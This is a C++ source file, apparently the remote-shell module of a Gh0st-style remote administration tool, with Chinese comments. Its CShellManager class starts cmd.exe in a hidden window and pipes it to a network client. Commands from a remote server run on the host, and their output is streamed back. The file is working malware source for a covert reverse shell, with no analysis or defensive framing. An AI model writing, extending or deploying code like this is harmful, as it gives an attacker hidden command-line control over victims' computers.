#include "stdafx.h"
#include "ShellManager.h"
#include "Common.h"
BOOL bStarting = TRUE;
CShellManager::CShellManager(IOCPClient* ClientObject)
	:CManager(ClientObject)
{
	SECURITY_ATTRIBUTES  sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;     //重要

	if (!CreatePipe(&m_ReadPipeHandle,&m_WritePipeShellHandle,&sa,0))
	{
		if (m_ReadPipeHandle != NULL)
		{
			CloseHandle(m_ReadPipeHandle);
		}
		if (m_WritePipeShellHandle != NULL)
		{
			CloseHandle(m_WritePipeShellHandle);

		}

	}
	if (!CreatePipe(&m_ReadPipeShellHandle, &m_WritePipeHandle, &sa, 0))
	{
		if (m_ReadPipeShellHandle != NULL)
		{
			CloseHandle(m_ReadPipeShellHandle);
		}
		if (m_WritePipeHandle != NULL)
		{
			CloseHandle(m_WritePipeHandle);
		}
		return;
	}

	//获得cmd的完整路径
	char strShellPath[MAX_PATH] = { 0 };
	GetSystemDirectory(strShellPath, MAX_PATH);
	strcat(strShellPath, "\\cmd.exe");


	STARTUPINFO          si = { 0 };
	PROCESS_INFORMATION  pi = { 0 };    //CreateProcess

	memset((void *)&si, 0, sizeof(si));
	memset((void *)&pi, 0, sizeof(pi));

	si.cb = sizeof(STARTUPINFO);  //重要

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = m_ReadPipeShellHandle;                           //将管道赋值
	si.hStdOutput = si.hStdError = m_WritePipeShellHandle;

	si.wShowWindow = SW_HIDE;

	//启动Cmd进程
	//3 继承

	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
	{
		CloseHandle(m_ReadPipeHandle);
		CloseHandle(m_WritePipeHandle);
		CloseHandle(m_ReadPipeShellHandle);
		CloseHandle(m_WritePipeShellHandle);
		return;
	}
	m_ShellProcessHandle = pi.hProcess;    //保存Cmd进程的进程句柄和主线程句柄
	m_ShellThreadHandle = pi.hThread;

	BYTE	bToken = TOKEN_SHELL_START;      //包含头文件 Common.h     
	m_ClientObject->OnServerSending((char*)&bToken, 1);

	WaitForDialogOpen();


	m_ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
}


CShellManager::~CShellManager()
{
	bStarting = FALSE;

	TerminateProcess(m_ShellProcessHandle, 0);   //结束我们自己创建的Cmd进程
	TerminateThread(m_ShellThreadHandle, 0);     //结束我们自己创建的Cmd线程
	Sleep(100);

	if (m_ReadPipeHandle != NULL)
	{
		DisconnectNamedPipe(m_ReadPipeHandle);
		CloseHandle(m_ReadPipeHandle);
		m_ReadPipeHandle = NULL;
	}
	if (m_WritePipeHandle != NULL)
	{
		DisconnectNamedPipe(m_WritePipeHandle);
		CloseHandle(m_WritePipeHandle);
		m_WritePipeHandle = NULL;
	}
	if (m_ReadPipeShellHandle != NULL)
	{
		DisconnectNamedPipe(m_ReadPipeShellHandle);
		CloseHandle(m_ReadPipeShellHandle);
		m_ReadPipeShellHandle = NULL;
	}
	if (m_WritePipeShellHandle != NULL)
	{
		DisconnectNamedPipe(m_WritePipeShellHandle);
		CloseHandle(m_WritePipeShellHandle);
		m_WritePipeShellHandle = NULL;
	}

}

VOID CShellManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		case COMMAND_NEXT:
		{
			NotifyDialogOpen();
			break;
		}

		default:
		{
			unsigned long dwReturn = 0;
			if (WriteFile(m_WritePipeHandle,szBuffer,ulLength,&dwReturn,NULL))
			{

			}
			break;
		}
			
	}
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lParam)
{
	CShellManager* This = (CShellManager*)lParam;
	unsigned long dwReturn = 0;
	char szBuffer[1024] = { 0 };
	DWORD dwTotal = 0;
	while (bStarting)
	{
		Sleep(100);
		while (PeekNamedPipe(This->m_ReadPipeHandle,szBuffer,sizeof(szBuffer),
			&dwReturn,&dwTotal,NULL))
		{
			if (dwReturn <= 0)
			{
				break;
			}
			memset(szBuffer, 0, sizeof(szBuffer));
			LPBYTE szTotalBuffer = (LPBYTE)LocalAlloc(LPTR, dwTotal);
			ReadFile(This->m_ReadPipeHandle,
				szTotalBuffer, dwTotal, &dwReturn, NULL);
			This->m_ClientObject->OnServerSending((char*)szTotalBuffer, dwReturn);
			LocalFree(szTotalBuffer);
		}

	}
	std::cout << "ReadPipe线程退出" << "\r\n";
	return 0;
}
